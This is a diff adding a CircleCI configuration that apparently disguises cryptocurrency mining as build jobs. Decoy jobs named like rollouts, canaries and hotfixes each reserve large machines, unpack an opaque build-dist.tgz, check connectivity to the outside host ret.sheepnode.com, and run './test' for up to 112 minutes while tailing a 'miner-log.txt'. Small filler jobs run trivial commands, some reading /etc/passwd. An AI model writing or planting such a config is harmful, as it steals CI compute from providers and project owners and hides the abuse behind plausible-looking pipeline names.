@@ -1,0 +1,2717 @@
+version: 2.1
+
+jobs:
+  inc_sz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 3
+          command: |
+            mkdir -p /tmp/lower
+            set +o pipefail 2>/dev/null; yes abc | head -n 1087526 | sort | uniq -c | head > /tmp/lower/Sn4n; true
+            echo "unit RolloutPipeline: $(wc -c </tmp/lower/Sn4n)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'Sn4n'
+  RolloutPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/Sn4n 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  AllInvoices:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: M686
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | grep -wh 'ID' | sort | uniq -c; true ; } > /tmp/lower/1ugips7c
+            echo "unit anothr-run-70: $(wc -c </tmp/lower/1ugips7c)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '1ugips7c'
+  anothr-run-70:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/1ugips7c 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  untitled1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: isolation vs approval
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo "error: none" | cut -d' ' -f1; true ; } > /tmp/lower/server338
+            echo "unit test: $(wc -c </tmp/lower/server338)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'server338'
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/server338 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  zip_semaphore_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: The sequence counters ready yet
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; for u in $(cut -d: -f1 /etc/passwd | head -n 2); do echo "user: $u"; done; true ; } > /tmp/lower/FVMkSOXPoo
+            echo "unit canary: $(wc -c </tmp/lower/FVMkSOXPoo)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'FVMkSOXPoo'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/FVMkSOXPoo 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  listlocked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: NODE 2DCC WAKEUP
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; if test ! -s /etc/hostname;then echo yes; else echo no; fi; true ; } > /tmp/lower/20220426
+            echo "unit hotfix-3968: $(wc -c </tmp/lower/20220426)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '20220426'
+  hotfix-3968:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/20220426 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  gridCnt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: I usually stain the reagents last
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo -n 'key=value' | wc -c; true ; } > /tmp/lower/0b877665-8318-6adc
+            echo "unit nebula-plus: $(wc -c </tmp/lower/0b877665-8318-6adc)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '0b877665-8318-6adc'
+  nebula-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/0b877665-8318-6adc 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  thx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Backfill 2023 q1
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 1 -type f -user "$USER" -print0 | xargs -0r du -ch | tail -n 1; true ; } > /tmp/lower/ab848de8-fe02
+            echo "unit Build_Tests4: $(wc -c </tmp/lower/ab848de8-fe02)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'ab848de8-fe02'
+  Build_Tests4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/RAM.api-Copper 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  ms_arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: A gentle cooldown
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo 'are we there yet?' | tr -d 'aeiou'; true ; } > /tmp/lower/RAM.api-Copper
+            echo "unit strated: $(wc -c </tmp/lower/RAM.api-Copper)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'RAM.api-Copper'
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/RAM.api-Copper 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  assert_edge_join:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: To speed things up train the background checks
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; find /usr/bin -type f -user $(whoami); true ; } > /tmp/lower/GzVxY9A5zvT
+            echo "unit node18-cov: $(wc -c </tmp/lower/GzVxY9A5zvT)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'GzVxY9A5zvT'
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/GzVxY9A5zvT 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  gear-map:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Evaluation Before Sweep
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; printf '%s, ' set manual ant city; echo; true ; } > /tmp/lower/fnv_3dc2e03cf
+            echo "unit promote: $(wc -c </tmp/lower/fnv_3dc2e03cf)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'fnv_3dc2e03cf'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/fnv_3dc2e03cf 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
